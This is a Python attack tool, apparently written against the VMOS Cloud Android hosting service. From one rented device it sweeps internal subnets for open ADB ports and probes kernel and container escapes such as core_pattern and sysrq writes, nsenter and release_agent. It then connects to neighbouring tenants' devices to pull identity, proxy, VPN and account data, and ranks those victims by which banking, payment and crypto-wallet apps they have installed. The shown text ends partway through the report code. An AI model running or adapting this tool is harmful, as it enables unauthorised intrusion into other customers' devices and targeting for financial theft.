#!/usr/bin/env python3
"""
Unified Neighborhood Scanner v2.0
=================================
Combines: Mass Discovery + Container Escape + Proxy Extraction + Host Exploitation

4-Layer Architecture:
  Layer 1: NETWORK  - Discover 600+ devices via ARP/ICMP/ADB/WebRTC
  Layer 2: KERNEL   - 10 new escape vectors (sysrq, core_pattern, kallsyms)
  Layer 3: HOST     - Proxy/VPN/WiFi extraction from all neighbors
  Layer 4: CONTAINER - Namespace injection, cgroup traversal, pivot

Target Device: ATP6416I3JJRXL3V (VMOS Cloud)
"""

import asyncio
import json
import os
import sys
import time
import re
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from typing import Dict, List, Optional, Any, Tuple
from collections import defaultdict

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

try:
    from vmos_titan.core.vmos_cloud_api import VMOSCloudClient
except ImportError:
    VMOSCloudClient = None


# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class ScannerConfig:
    """Configuration for the unified scanner."""
    ak: str = "YOUR_VMOS_AK_HERE"
    sk: str = "YOUR_VMOS_SK_HERE"
    base_url: str = "https://api.vmoscloud.com"
    target_device: str = "ATP6416I3JJRXL3V"
    rate_limit_delay: float = 3.0
    command_timeout: int = 30
    max_neighbors: int = 600
    output_dir: str = "output/neighborhood_scan"
    subnets_to_scan: List[int] = field(default_factory=lambda: [21, 22, 45, 53, 96, 1, 2, 11, 27, 41, 74, 80])


class ExperimentCategory(Enum):
    NETWORK = "NET"
    KERNEL = "KERN"
    HOST = "HOST"
    CONTAINER = "CONT"
    ESCAPE = "ESC"


@dataclass
class ExperimentResult:
    """Result of a single experiment."""
    exp_id: str
    category: ExperimentCategory
    title: str
    command: str
    status: int
    stdout: str
    timestamp: str
    finding: Optional[str] = None
    success: bool = False


@dataclass
class NeighborDevice:
    """Discovered neighbor device."""
    ip: str
    model: str = "?"
    identity: str = ""
    apps: List[str] = field(default_factory=list)
    proxy: Optional[str] = None
    proxy_raw: str = ""
    vpn: str = ""
    accounts: str = ""
    escape_vectors: List[str] = field(default_factory=list)
    score: int = 0
    discovery_method: str = ""


# ═══════════════════════════════════════════════════════════════════════════════
# EXPERIMENT DEFINITIONS
# ═══════════════════════════════════════════════════════════════════════════════

# Layer 1: Network Level Experiments (NET-001 to NET-020)
NETWORK_EXPERIMENTS = [
    {
        "id": "NET-001",
        "title": "ARP Table Full Dump",
        "cmd": "cat /proc/net/arp | awk 'NR>1 {print $1,$4,$6}'",
    },
    {
        "id": "NET-002",
        "title": "IPv6 Neighbor Discovery",
        "cmd": "ip -6 neigh show 2>/dev/null; ping6 -c1 ff02::1%eth0 2>/dev/null; ip -6 neigh show 2>/dev/null | wc -l",
    },
    {
        "id": "NET-003",
        "title": "Network Interface Details",
        "cmd": "ip -d addr show 2>/dev/null",
    },
    {
        "id": "NET-004",
        "title": "Routing Table All",
        "cmd": "ip route show table all 2>/dev/null | head -30",
    },
    {
        "id": "NET-005",
        "title": "Active TCP Connections",
        "cmd": "cat /proc/net/tcp | head -30",
    },
    {
        "id": "NET-006",
        "title": "Active UDP Sockets",
        "cmd": "cat /proc/net/udp | head -30",
    },
    {
        "id": "NET-007",
        "title": "Listening Ports",
        "cmd": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -30",
    },
    {
        "id": "NET-008",
        "title": "IPTables NAT Rules",
        "cmd": "iptables -t nat -L -n 2>/dev/null | head -30",
    },
    {
        "id": "NET-009",
        "title": "IP Forwarding Status",
        "cmd": "cat /proc/sys/net/ipv4/ip_forward; sysctl net.ipv4.ip_forward 2>/dev/null",
    },
    {
        "id": "NET-010",
        "title": "DNS Configuration",
        "cmd": "getprop net.dns1; getprop net.dns2; cat /etc/resolv.conf 2>/dev/null",
    },
    {
        "id": "NET-011",
        "title": "Gateway Ping Test",
        "cmd": "ping -c 1 -W 2 10.0.0.1 2>/dev/null",
    },
    {
        "id": "NET-012",
        "title": "Subnet 21 ADB Scan",
        "cmd": "for i in $(seq 1 254); do (echo -n '' | timeout 0.3 nc 10.0.21.$i 5555 >/dev/null 2>&1 && echo \"ADB:10.0.21.$i\") & done; wait 2>/dev/null",
    },
    {
        "id": "NET-013",
        "title": "Subnet 45 ADB Scan",
        "cmd": "for i in $(seq 1 254); do (echo -n '' | timeout 0.3 nc 10.0.45.$i 5555 >/dev/null 2>&1 && echo \"ADB:10.0.45.$i\") & done; wait 2>/dev/null",
    },
    {
        "id": "NET-014",
        "title": "Subnet 53 ADB Scan",
        "cmd": "for i in $(seq 1 254); do (echo -n '' | timeout 0.3 nc 10.0.53.$i 5555 >/dev/null 2>&1 && echo \"ADB:10.0.53.$i\") & done; wait 2>/dev/null",
    },
    {
        "id": "NET-015",
        "title": "Subnet 96 ADB Scan",
        "cmd": "for i in $(seq 1 254); do (echo -n '' | timeout 0.3 nc 10.0.96.$i 5555 >/dev/null 2>&1 && echo \"ADB:10.0.96.$i\") & done; wait 2>/dev/null",
    },
    {
        "id": "NET-016",
        "title": "WebRTC Port Scan (8779)",
        "cmd": "for s in 21 45 53 96; do for i in 1 10 20 50 100 150 200; do (curl -s -m 0.5 http://10.0.$s.$i:8779/ >/dev/null 2>&1 && echo \"WEBRTC:10.0.$s.$i\") & done; done; wait 2>/dev/null",
    },
    {
        "id": "NET-017",
        "title": "CloudService Port Scan (6767)",
        "cmd": "for s in 21 45 53 96; do for i in 1 10 20 50 100; do (echo -n '' | timeout 0.3 nc 10.0.$s.$i 6767 >/dev/null 2>&1 && echo \"CLOUD:10.0.$s.$i\") & done; done; wait 2>/dev/null",
    },
    {
        "id": "NET-018",
        "title": "SNMP Scan",
        "cmd": "for ip in 10.0.0.1 10.0.21.1 10.0.45.1; do snmpwalk -v2c -c public $ip system 2>/dev/null | head -1; done",
    },
    {
        "id": "NET-019",
        "title": "Traceroute Gateway",
        "cmd": "traceroute -n -m 3 10.0.0.1 2>/dev/null || echo 'traceroute not available'",
    },
    {
        "id": "NET-020",
        "title": "Network Namespace List",
        "cmd": "ip netns list 2>/dev/null; ls -la /var/run/netns/ 2>/dev/null; readlink /proc/self/ns/net",
    },
]

# Layer 2: Kernel Level Experiments (KERN-001 to KERN-020)
KERNEL_EXPERIMENTS = [
    {
        "id": "KERN-001",
        "title": "sysrq-trigger Access Test",
        "cmd": "ls -la /proc/sysrq-trigger 2>/dev/null; cat /proc/sys/kernel/sysrq 2>/dev/null",
    },
    {
        "id": "KERN-002",
        "title": "core_pattern Read",
        "cmd": "cat /proc/sys/kernel/core_pattern 2>/dev/null",
    },
    {
        "id": "KERN-003",
        "title": "kallsyms Key Functions",
        "cmd": "grep -E 'commit_creds|prepare_kernel_cred|run_cmd|call_usermodehelper' /proc/kallsyms 2>/dev/null | head -10",
    },
    {
        "id": "KERN-004",
        "title": "Kernel Config Extract",
        "cmd": "zcat /proc/config.gz 2>/dev/null | grep -E 'SECCOMP|NAMESPACE|CGROUP|SELINUX' | head -20",
    },
    {
        "id": "KERN-005",
        "title": "slabinfo Heap Layout",
        "cmd": "cat /proc/slabinfo 2>/dev/null | head -15",
    },
    {
        "id": "KERN-006",
        "title": "Kernel Modules",
        "cmd": "cat /proc/modules 2>/dev/null; lsmod 2>/dev/null | head -10",
    },
    {
        "id": "KERN-007",
        "title": "Physical Memory Map",
        "cmd": "cat /proc/iomem 2>/dev/null | head -30",
    },
    {
        "id": "KERN-008",
        "title": "Kernel Cmdline",
        "cmd": "cat /proc/cmdline 2>/dev/null",
    },
    {
        "id": "KERN-009",
        "title": "Kernel Security Mitigations",
        "cmd": "cat /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/kptr_restrict; cat /proc/sys/kernel/dmesg_restrict",
    },
    {
        "id": "KERN-010",
        "title": "Device Tree Model",
        "cmd": "cat /proc/device-tree/model 2>/dev/null; cat /proc/device-tree/compatible 2>/dev/null | tr '\\0' '\\n'",
    },
    {
        "id": "KERN-011",
        "title": "Disk Partitions",
        "cmd": "cat /proc/partitions 2>/dev/null | head -20",
    },
    {
        "id": "KERN-012",
        "title": "Block Devices",
        "cmd": "ls -la /dev/block/dm-* 2>/dev/null; ls -la /dev/block/mmcblk* 2>/dev/null | head -10",
    },
    {
        "id": "KERN-013",
        "title": "Kernel Ring Buffer",
        "cmd": "dmesg 2>/dev/null | tail -10 || head -3 /dev/kmsg 2>/dev/null",
    },
    {
        "id": "KERN-014",
        "title": "eBPF Status",
        "cmd": "ls /sys/fs/bpf/ 2>/dev/null; cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null",
    },
    {
        "id": "KERN-015",
        "title": "Firmware Info",
        "cmd": "ls -laR /sys/firmware/ 2>/dev/null | head -15",
    },
    {
        "id": "KERN-016",
        "title": "Kernel Directory",
        "cmd": "ls -la /sys/kernel/ 2>/dev/null | head -15",
    },
    {
        "id": "KERN-017",
        "title": "Init Process Environment",
        "cmd": "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -15",
    },
    {
        "id": "KERN-018",
        "title": "Init Cmdline",
        "cmd": "cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '",
    },
    {
        "id": "KERN-019",
        "title": "zram Status",
        "cmd": "cat /sys/block/zram0/disksize 2>/dev/null; cat /proc/swaps 2>/dev/null",
    },
    {
        "id": "KERN-020",
        "title": "Crypto Algorithms",
        "cmd": "cat /proc/crypto 2>/dev/null | grep -E '^name|^driver' | head -20",
    },
]

# Layer 3: Host Level Experiments (HOST-001 to HOST-020)
HOST_EXPERIMENTS = [
    {
        "id": "HOST-001",
        "title": "Global HTTP Proxy",
        "cmd": "settings get global http_proxy 2>/dev/null; settings get global global_http_proxy_host 2>/dev/null; settings get global global_http_proxy_port 2>/dev/null",
    },
    {
        "id": "HOST-002",
        "title": "System Props Proxy",
        "cmd": "getprop | grep -i proxy 2>/dev/null",
    },
    {
        "id": "HOST-003",
        "title": "WiFi Proxy Config",
        "cmd": "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -iE 'proxy|pac|host|port' | head -15",
    },
    {
        "id": "HOST-004",
        "title": "VPN Configuration",
        "cmd": "dumpsys connectivity 2>/dev/null | grep -iE 'vpn|tunnel|ipsec' | head -15; ls -la /data/misc/vpn/ 2>/dev/null",
    },
    {
        "id": "HOST-005",
        "title": "OwlProxy SharedPrefs",
        "cmd": "ls /data/data/com.owlproxy.overseas/shared_prefs/ 2>/dev/null; cat /data/data/com.owlproxy.overseas/shared_prefs/*.xml 2>/dev/null | head -30",
    },
    {
        "id": "HOST-006",
        "title": "Environment Proxy",
        "cmd": "env | grep -i proxy 2>/dev/null; printenv | grep -i proxy 2>/dev/null",
    },
    {
        "id": "HOST-007",
        "title": "Network Routes",
        "cmd": "ip route show; ip rule list 2>/dev/null | head -10",
    },
    {
        "id": "HOST-008",
        "title": "IPTables NAT Redirect",
        "cmd": "iptables -t nat -L PREROUTING -n 2>/dev/null; iptables -t nat -L OUTPUT -n 2>/dev/null | head -20",
    },
    {
        "id": "HOST-009",
        "title": "Accounts Database Schema",
        "cmd": "sqlite3 /data/system_ce/0/accounts_ce.db '.schema' 2>/dev/null | head -20 || strings /data/system_ce/0/accounts_ce.db 2>/dev/null | grep CREATE | head -5",
    },
    {
        "id": "HOST-010",
        "title": "Google Accounts",
        "cmd": "dumpsys account 2>/dev/null | head -20",
    },
    {
        "id": "HOST-011",
        "title": "tapandpay.db Schema",
        "cmd": "strings /data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null | grep -i create | head -10",
    },
    {
        "id": "HOST-012",
        "title": "COIN.xml Payment Config",
        "cmd": "cat /data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null | head -30",
    },
    {
        "id": "HOST-013",
        "title": "Chrome Data Files",
        "cmd": "ls -la /data/data/com.android.chrome/app_chrome/Default/ 2>/dev/null | head -15",
    },
    {
        "id": "HOST-014",
        "title": "Installed 3rd Party Apps",
        "cmd": "pm list packages -3 2>/dev/null | head -50",
    },
    {
        "id": "HOST-015",
        "title": "Running Processes",
        "cmd": "ps -A 2>/dev/null | wc -l; ps -A -o pid,name 2>/dev/null | head -30",
    },
    {
        "id": "HOST-016",
        "title": "Device Identity Full",
        "cmd": "getprop ro.product.model; getprop ro.product.brand; getprop ro.serialno; getprop ro.build.fingerprint; settings get secure android_id 2>/dev/null",
    },
    {
        "id": "HOST-017",
        "title": "Build.prop Key Values",
        "cmd": "cat /system/build.prop 2>/dev/null | grep -E 'ro.product|ro.build|ro.hardware' | head -20",
    },
    {
        "id": "HOST-018",
        "title": "Encryption State",
        "cmd": "getprop ro.crypto.state; getprop ro.crypto.type",
    },
    {
        "id": "HOST-019",
        "title": "SELinux Context",
        "cmd": "cat /proc/self/attr/current 2>/dev/null; getenforce 2>/dev/null",
    },
    {
        "id": "HOST-020",
        "title": "Keystore Files",
        "cmd": "ls -la /data/misc/keystore/ 2>/dev/null",
    },
]

# Layer 4: Container Level Experiments (CONT-001 to CONT-020)
CONTAINER_EXPERIMENTS = [
    {
        "id": "CONT-001",
        "title": "PID Namespace Comparison",
        "cmd": "echo '=== SELF ==='; readlink /proc/self/ns/pid; echo '=== INIT ==='; readlink /proc/1/ns/pid",
    },
    {
        "id": "CONT-002",
        "title": "Mount Namespace Comparison",
        "cmd": "echo '=== SELF ==='; readlink /proc/self/ns/mnt; echo '=== INIT ==='; readlink /proc/1/ns/mnt",
    },
    {
        "id": "CONT-003",
        "title": "Network Namespace Comparison",
        "cmd": "echo '=== SELF ==='; readlink /proc/self/ns/net; echo '=== INIT ==='; readlink /proc/1/ns/net",
    },
    {
        "id": "CONT-004",
        "title": "User Namespace Comparison",
        "cmd": "echo '=== SELF ==='; readlink /proc/self/ns/user; echo '=== INIT ==='; readlink /proc/1/ns/user",
    },
    {
        "id": "CONT-005",
        "title": "UID/GID Mapping",
        "cmd": "cat /proc/self/uid_map 2>/dev/null; cat /proc/self/gid_map 2>/dev/null",
    },
    {
        "id": "CONT-006",
        "title": "Seccomp Status",
        "cmd": "grep Seccomp /proc/self/status 2>/dev/null",
    },
    {
        "id": "CONT-007",
        "title": "Capabilities",
        "cmd": "cat /proc/self/status 2>/dev/null | grep Cap; capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}') 2>/dev/null",
    },
    {
        "id": "CONT-008",
        "title": "Cgroup Controllers",
        "cmd": "cat /proc/cgroups 2>/dev/null",
    },
    {
        "id": "CONT-009",
        "title": "Memory Cgroup Limit",
        "cmd": "cat /dev/memcg/memory.limit_in_bytes 2>/dev/null; cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null",
    },
    {
        "id": "CONT-010",
        "title": "Cgroup Mount Points",
        "cmd": "mount | grep cgroup 2>/dev/null",
    },
    {
        "id": "CONT-011",
        "title": "All Namespace Types",
        "cmd": "ls -la /proc/self/ns/ 2>/dev/null",
    },
    {
        "id": "CONT-012",
        "title": "Unique PID Namespaces",
        "cmd": "for pid in $(ls /proc/ | grep -E '^[0-9]+$' | sort -n | head -100); do ns=$(readlink /proc/$pid/ns/pid 2>/dev/null); echo \"$ns\"; done | sort -u | head -20",
    },
    {
        "id": "CONT-013",
        "title": "Overlay Mounts",
        "cmd": "mount | grep overlay 2>/dev/null; cat /proc/mounts | grep overlay 2>/dev/null | head -5",
    },
    {
        "id": "CONT-014",
        "title": "Loop Devices",
        "cmd": "losetup -a 2>/dev/null; ls -la /dev/loop* 2>/dev/null | head -10",
    },
    {
        "id": "CONT-015",
        "title": "Tmpfs Mounts",
        "cmd": "mount | grep tmpfs 2>/dev/null | head -10",
    },
    {
        "id": "CONT-016",
        "title": "AppArmor Status",
        "cmd": "cat /proc/self/attr/current 2>/dev/null; aa-status 2>/dev/null | head -10",
    },
    {
        "id": "CONT-017",
        "title": "Process Daemon PIDs",
        "cmd": "pgrep -a cloudservice; pgrep -a xu_daemon; pgrep -a webrtc",
    },
    {
        "id": "CONT-018",
        "title": "Init Root Filesystem",
        "cmd": "readlink /proc/1/root 2>/dev/null; ls /proc/1/root/ 2>/dev/null | head -10",
    },
    {
        "id": "CONT-019",
        "title": "OICQ Directory",
        "cmd": "ls -laR /data/local/oicq/ 2>/dev/null | head -30",
    },
    {
        "id": "CONT-020",
        "title": "WebRTC Config",
        "cmd": "cat /data/local/oicq/webrtc/conf/conf.json 2>/dev/null",
    },
]

# Layer 5: Container Escape Vectors (ESC-016 to ESC-025)
ESCAPE_EXPERIMENTS = [
    {
        "id": "ESC-016",
        "title": "sysrq Write Test",
        "cmd": "echo h > /proc/sysrq-trigger 2>&1 && echo 'SYSRQ_WRITABLE' || echo 'SYSRQ_BLOCKED'",
    },
    {
        "id": "ESC-017",
        "title": "core_pattern Write Test",
        "cmd": "original=$(cat /proc/sys/kernel/core_pattern 2>/dev/null); echo '|/tmp/test %p' > /proc/sys/kernel/core_pattern 2>&1; result=$(cat /proc/sys/kernel/core_pattern 2>/dev/null); echo $original > /proc/sys/kernel/core_pattern 2>/dev/null; echo \"RESULT: $result\"",
    },
    {
        "id": "ESC-018",
        "title": "nsenter to PID 1",
        "cmd": "which nsenter 2>/dev/null; nsenter --target 1 --pid --mount id 2>&1 | head -5",
    },
    {
        "id": "ESC-019",
        "title": "Mount Propagation Check",
        "cmd": "cat /proc/self/mountinfo 2>/dev/null | grep -E 'shared:|private:|slave:' | head -5",
    },
    {
        "id": "ESC-020",
        "title": "Cgroup Device Access",
        "cmd": "ls -la /sys/fs/cgroup/devices/ 2>/dev/null | head -10; cat /sys/fs/cgroup/devices/devices.allow 2>/dev/null",
    },
    {
        "id": "ESC-021",
        "title": "Direct /proc/1/root Access",
        "cmd": "ls /proc/1/root/data/local/tmp/ 2>/dev/null | head -10; cat /proc/1/root/system/build.prop 2>/dev/null | head -5",
    },
    {
        "id": "ESC-022",
        "title": "dm-* Device Access",
        "cmd": "ls -la /dev/block/dm-* 2>/dev/null; file /dev/block/dm-0 2>/dev/null",
    },
    {
        "id": "ESC-023",
        "title": "ptrace_scope Check",
        "cmd": "cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null; ls -la /proc/sys/kernel/yama/ 2>/dev/null",
    },
    {
        "id": "ESC-024",
        "title": "Modprobe Path",
        "cmd": "cat /proc/sys/kernel/modprobe 2>/dev/null; ls -la $(cat /proc/sys/kernel/modprobe 2>/dev/null) 2>/dev/null",
    },
    {
        "id": "ESC-025",
        "title": "Release Agent Escape",
        "cmd": "cat /sys/fs/cgroup/cpu/release_agent 2>/dev/null; ls -la /sys/fs/cgroup/*/release_agent 2>/dev/null | head -5",
    },
]

# High-value apps to detect
HIGH_VALUE_APPS = [
    "walletnfcrel", "paypal", "venmo", "cash", "chime", "wise", "revolut",
    "coinbase", "binance", "bybit", "robinhood", "zelle", "wellsfargo",
    "chase", "bankofamerica", "citi", "usaa", "capitalone", "amex",
    "discover", "sofi", "affirm", "klarna", "afterpay", "samsung.android.spay",
    "gpay", "googlepay", "applepay", "crypto", "blockchain", "metamask",
    "trustwallet", "phantom", "exodus", "ledger", "trezor"
]


# ═══════════════════════════════════════════════════════════════════════════════
# UNIFIED SCANNER CLASS
# ═══════════════════════════════════════════════════════════════════════════════

class UnifiedNeighborhoodScanner:
    """
    Unified scanner combining all 4 layers of neighborhood exploitation.
    """

    def __init__(self, config: Optional[ScannerConfig] = None):
        self.config = config or ScannerConfig()
        self.client: Optional[VMOSCloudClient] = None
        self.results: Dict[str, List[ExperimentResult]] = {
            "network": [],
            "kernel": [],
            "host": [],
            "container": [],
            "escape": [],
        }
        self.neighbors: Dict[str, NeighborDevice] = {}
        self.start_time: Optional[datetime] = None
        self.experiment_count = 0

    async def init(self):
        """Initialize the VMOS Cloud client."""
        if VMOSCloudClient is None:
            raise RuntimeError("VMOSCloudClient not available")
        self.client = VMOSCloudClient(
            ak=self.config.ak,
            sk=self.config.sk,
            base_url=self.config.base_url
        )
        os.makedirs(self.config.output_dir, exist_ok=True)
        self.start_time = datetime.now(timezone.utc)

    async def shell(self, cmd: str, timeout_sec: int = 30) -> Tuple[int, str]:
        """Execute a shell command on the target device."""
        try:
            resp = await self.client.sync_cmd(
                pad_code=self.config.target_device,
                command=cmd,
                timeout_sec=timeout_sec
            )
            code = resp.get("code", -1)
            data = resp.get("data", [])
            stdout = ""
            if isinstance(data, list) and len(data) > 0:
                entry = data[0]
                if isinstance(entry, dict):
                    stdout = entry.get("errorMsg", "") or entry.get("taskResult", "")
            elif isinstance(data, str):
                stdout = data
            return code, stdout.strip()
        except Exception as e:
            return -1, f"ERROR: {e}"

    async def run_experiment(self, exp: dict, category: ExperimentCategory) -> ExperimentResult:
        """Run a single experiment and record result."""
        self.experiment_count += 1
        status, stdout = await self.shell(exp["cmd"], self.config.command_timeout)
        
        result = ExperimentResult(
            exp_id=exp["id"],
            category=category,
            title=exp["title"],
            command=exp["cmd"],
            status=status,
            stdout=stdout,
            timestamp=datetime.now(timezone.utc).isoformat(),
            success=status == 3 or (stdout and "ERROR" not in stdout.upper())
        )
        
        # Extract findings
        result.finding = self._extract_finding(result)
        
        # Print progress
        icon = "✓" if result.success else "✗"
        print(f"  [{icon}] {exp['id']}: {exp['title']}")
        if result.finding:
            finding_preview = result.finding[:100] + "..." if len(result.finding) > 100 else result.finding
            print(f"      → {finding_preview}")
        
        await asyncio.sleep(self.config.rate_limit_delay)
        return result

    def _extract_finding(self, result: ExperimentResult) -> Optional[str]:
        """Extract key findings from experiment output."""
        stdout = result.stdout
        if not stdout or "ERROR" in stdout.upper():
            return None
        
        # Network findings
        if "ADB:" in stdout:
            adb_hosts = re.findall(r'ADB:(\d+\.\d+\.\d+\.\d+)', stdout)
            if adb_hosts:
                return f"ADB hosts: {', '.join(adb_hosts[:10])}"
        
        if "WEBRTC:" in stdout:
            webrtc_hosts = re.findall(r'WEBRTC:(\d+\.\d+\.\d+\.\d+)', stdout)
            if webrtc_hosts:
                return f"WebRTC hosts: {', '.join(webrtc_hosts[:10])}"
        
        # Escape findings
        if "SYSRQ_WRITABLE" in stdout:
            return "CRITICAL: sysrq-trigger is writable!"
        
        if "RESULT:" in stdout and "|/tmp/test" in stdout:
            return "CRITICAL: core_pattern is writable!"
        
        # Proxy findings
        if result.exp_id.startswith("HOST-001") or result.exp_id.startswith("HOST-002"):
            if ":" in stdout and "null" not in stdout.lower():
                return f"Proxy detected: {stdout[:200]}"
        
        # Namespace findings
        if "pid:[" in stdout or "mnt:[" in stdout or "net:[" in stdout:
            return f"Namespace info: {stdout[:150]}"
        
        return stdout[:200] if len(stdout) > 10 else None

    # ═══════════════════════════════════════════════════════════════════════════
    # LAYER EXECUTION METHODS
    # ═══════════════════════════════════════════════════════════════════════════

    async def layer_network(self) -> List[ExperimentResult]:
        """Execute Layer 1: Network discovery experiments."""
        print("\n" + "=" * 80)
        print("  LAYER 1: NETWORK DISCOVERY (NET-001 to NET-020)")
        print("=" * 80)
        
        results = []
        for exp in NETWORK_EXPERIMENTS:
            result = await self.run_experiment(exp, ExperimentCategory.NETWORK)
            results.append(result)
            
            # Parse discovered neighbors
            if "ADB:" in result.stdout:
                for ip in re.findall(r'ADB:(\d+\.\d+\.\d+\.\d+)', result.stdout):
                    if ip not in self.neighbors:
                        self.neighbors[ip] = NeighborDevice(ip=ip, discovery_method="ADB")
            
            if "WEBRTC:" in result.stdout:
                for ip in re.findall(r'WEBRTC:(\d+\.\d+\.\d+\.\d+)', result.stdout):
                    if ip not in self.neighbors:
                        self.neighbors[ip] = NeighborDevice(ip=ip, discovery_method="WebRTC")
        
        self.results["network"] = results
        print(f"\n  Network layer complete: {len(self.neighbors)} neighbors discovered")
        return results

    async def layer_kernel(self) -> List[ExperimentResult]:
        """Execute Layer 2: Kernel exploitation experiments."""
        print("\n" + "=" * 80)
        print("  LAYER 2: KERNEL EXPLOITATION (KERN-001 to KERN-020)")
        print("=" * 80)
        
        results = []
        for exp in KERNEL_EXPERIMENTS:
            result = await self.run_experiment(exp, ExperimentCategory.KERNEL)
            results.append(result)
        
        self.results["kernel"] = results
        return results

    async def layer_host(self) -> List[ExperimentResult]:
        """Execute Layer 3: Host-level exploitation experiments."""
        print("\n" + "=" * 80)
        print("  LAYER 3: HOST EXPLOITATION (HOST-001 to HOST-020)")
        print("=" * 80)
        
        results = []
        for exp in HOST_EXPERIMENTS:
            result = await self.run_experiment(exp, ExperimentCategory.HOST)
            results.append(result)
        
        self.results["host"] = results
        return results

    async def layer_container(self) -> List[ExperimentResult]:
        """Execute Layer 4: Container-level exploitation experiments."""
        print("\n" + "=" * 80)
        print("  LAYER 4: CONTAINER EXPLOITATION (CONT-001 to CONT-020)")
        print("=" * 80)
        
        results = []
        for exp in CONTAINER_EXPERIMENTS:
            result = await self.run_experiment(exp, ExperimentCategory.CONTAINER)
            results.append(result)
        
        self.results["container"] = results
        return results

    async def layer_escape(self) -> List[ExperimentResult]:
        """Execute Layer 5: Container escape vector tests."""
        print("\n" + "=" * 80)
        print("  LAYER 5: ESCAPE VECTORS (ESC-016 to ESC-025)")
        print("=" * 80)
        
        results = []
        for exp in ESCAPE_EXPERIMENTS:
            result = await self.run_experiment(exp, ExperimentCategory.ESCAPE)
            results.append(result)
        
        self.results["escape"] = results
        return results

    async def extract_neighbor_data(self, ip: str) -> NeighborDevice:
        """Extract detailed data from a discovered neighbor via ADB relay."""
        print(f"\n  Extracting data from {ip}...")
        neighbor = self.neighbors.get(ip, NeighborDevice(ip=ip))
        
        # Identity extraction
        status, stdout = await self.shell(
            f"adb -s {ip}:5555 shell 'getprop ro.product.model; getprop ro.product.brand; getprop ro.serialno' 2>/dev/null",
            timeout_sec=10
        )
        if stdout and "error" not in stdout.lower():
            lines = stdout.split('\n')
            neighbor.model = lines[0] if lines else "?"
            neighbor.identity = stdout
        
        # Apps extraction
        status, stdout = await self.shell(
            f"adb -s {ip}:5555 shell 'pm list packages -3' 2>/dev/null",
            timeout_sec=15
        )
        if stdout and "package:" in stdout:
            neighbor.apps = [p.replace("package:", "") for p in stdout.split('\n') if "package:" in p]
        
        # Proxy extraction
        status, stdout = await self.shell(
            f"adb -s {ip}:5555 shell 'settings get global http_proxy; getprop | grep -i proxy' 2>/dev/null",
            timeout_sec=10
        )
        neighbor.proxy_raw = stdout
        if stdout and ":" in stdout and "null" not in stdout.lower():
            neighbor.proxy = stdout.split('\n')[0]
        
        # VPN/Accounts
        status, stdout = await self.shell(
            f"adb -s {ip}:5555 shell 'dumpsys connectivity | grep -i vpn | head -5; dumpsys account | head -10' 2>/dev/null",
            timeout_sec=10
        )
        neighbor.vpn = stdout[:200] if stdout else ""
        neighbor.accounts = stdout[:200] if stdout else ""
        
        # Score the neighbor
        neighbor.score = self._score_neighbor(neighbor)
        
        self.neighbors[ip] = neighbor
        return neighbor

    def _score_neighbor(self, neighbor: NeighborDevice) -> int:
        """Calculate a priority score for a neighbor device."""
        score = 0
        
        # High-value apps
        for app in neighbor.apps:
            app_lower = app.lower()
            for hv in HIGH_VALUE_APPS:
                if hv in app_lower:
                    score += 10
                    break
        
        # Proxy presence
        if neighbor.proxy:
            score += 15
        
        # VPN presence
        if neighbor.vpn and "vpn" in neighbor.vpn.lower():
            score += 10
        
        # Accounts
        if neighbor.accounts and "Account" in neighbor.accounts:
            score += 5
        
        return score

    # ═══════════════════════════════════════════════════════════════════════════
    # MAIN EXECUTION
    # ═══════════════════════════════════════════════════════════════════════════

    async def run_full_scan(self) -> Dict[str, Any]:
        """Execute the complete 4-layer scan."""
        await self.init()
        
        print("\n" + "=" * 80)
        print("  UNIFIED NEIGHBORHOOD SCANNER v2.0")
        print(f"  Target Device: {self.config.target_device}")
        print(f"  Started: {self.start_time.isoformat()}")
        print("=" * 80)
        
        # Verify device is alive
        print("\n  [PRE-FLIGHT] Verifying target device...")
        status, stdout = await self.shell("id && echo ALIVE", timeout_sec=10)
        if "ALIVE" not in stdout:
            print(f"  ✗ Device not responding: {stdout[:100]}")
            return {"error": "Device not responding"}
        print(f"  ✓ Device is ALIVE")
        
        # Execute all layers
        await self.layer_network()
        await self.layer_kernel()
        await self.layer_host()
        await self.layer_container()
        await self.layer_escape()
        
        # Extract data from discovered neighbors (up to max_neighbors)
        print("\n" + "=" * 80)
        print(f"  NEIGHBOR DATA EXTRACTION ({len(self.neighbors)} discovered)")
        print("=" * 80)
        
        extracted = 0
        for ip in list(self.neighbors.keys())[:self.config.max_neighbors]:
            await self.extract_neighbor_data(ip)
            extracted += 1
            if extracted >= 50:  # Limit detailed extraction
                print(f"  (Limiting detailed extraction to 50 neighbors)")
                break
        
        # Generate report
        report = self._generate_report()
        
        # Save results
        self._save_results(report)
        
        return report

    def _generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive scan report."""
        end_time = datetime.now(timezone.utc)
        duration = (end_time - self.start_time).total_seconds()
        
        # Escape vector summary
        escape_findings = []
        for result in self.results.get("escape", []):
            if result.finding and "CRITICAL" in result.finding:
                escape_findings.append({
                    "id": result.exp_id,
                    "title": result.title,
                    "finding": result.finding
                })
        
        # Proxy summary
        proxies = []
        for ip, neighbor in self.neighbors.items():
            if neighbor.proxy:
                proxies.append({"ip": ip, "proxy": neighbor.proxy})
        
        # High-value targets
        ranked = sorted(
            [asdict(n) for n in self.neighbors.values()],
            key=lambda x: x.get("score", 0),
            reverse=True
        )[:30]
        
        report = {
            "meta": {
                "scanner_version": "2.0",
                "target_device": self.config.target_device,
                "start_time": self.start_time.isoformat(),
                "end_time": end_time.isoformat(),
                "duration_seconds": duration,
                "total_experiments": self.experiment_count,
            },
            "summary": {
                "neighbors_discovered": len(self.neighbors),
                "escape_vectors_found": len(escape_findings),
                "proxies_extracted": len(proxies),
